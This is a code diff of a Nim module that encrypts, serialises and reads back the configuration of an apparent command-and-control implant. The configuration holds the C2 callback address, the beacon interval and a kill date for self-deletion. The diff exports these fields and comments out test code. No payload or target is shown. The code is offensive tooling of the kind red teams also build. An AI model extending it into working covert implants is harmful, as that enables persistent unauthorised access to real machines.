@@ -5,26 +5,20 @@ import sysrandom
 import std/oids
 import times
 
-# const LOOKUP_TABLE =
-#     when defined(release):
-#         staticRead("release.json")
-#     else:
-#         staticRead("debug.json")
-
 #this is used to store the encrypted bytes
 type
-  EncConfig = ref object
+  EncConfig* = ref object
     privKey: Key
     pubKey: Key
     encObj: EncMsg
 
 type
-  StaticConfig = ref object
+  StaticConfig* = ref object
     buildid: Oid      #generated on build
     deploymentid: Oid #generated on deployment
-    killEpoch: int32  #what point should the agent stop calling back and delete
-    interval: int32   #how often should the agent call back
-    callback: string  #where the C2 is 
+    killEpoch*: int32  #what point should the agent stop calling back and delete
+    interval*: int32   #how often should the agent call back
+    callback*: string  #where the C2 is 
 
 
 proc serEncConfig*(encMsg:StaticConfig): string = 
@@ -60,14 +54,16 @@ proc createEncConfig(): EncConfig =
   encConfig.encObj = encMsg(encConfig.privKey, encConfig.pubKey,configBytes)
   result = encConfig
 
-proc readEncConfig(encConfig:EncConfig): StaticConfig =
+proc readEncConfig*(encConfig:EncConfig): StaticConfig =
   let configBytes = decMsg(encConfig.privKey, encConfig.encObj)
-  let config = desEncConfig(configBytes)
+  let config = desEncConfig(toString(configBytes))
   result = config
 
-let testConfig = createEncConfig()
-let b64Str = b64str(toFlatty(testConfig))
-let ub64Str = unb64str(b64Str)
-let test = ub64Str.fromFlatty(EncConfig)
-let testRead = readEncConfig(test)
-echo testRead.callback
+# let testConfig = createEncConfig()
+# let b64Str = b64str(toFlatty(testConfig))
+# writeStringToFile("debug.config", b64Str)
+# writeStringToFile("release.config", b64Str)
+# let ub64Str = unb64str(b64Str)
+# let test = ub64Str.fromFlatty(EncConfig)
+# let testRead = readEncConfig(test)
+# echo testRead.callback
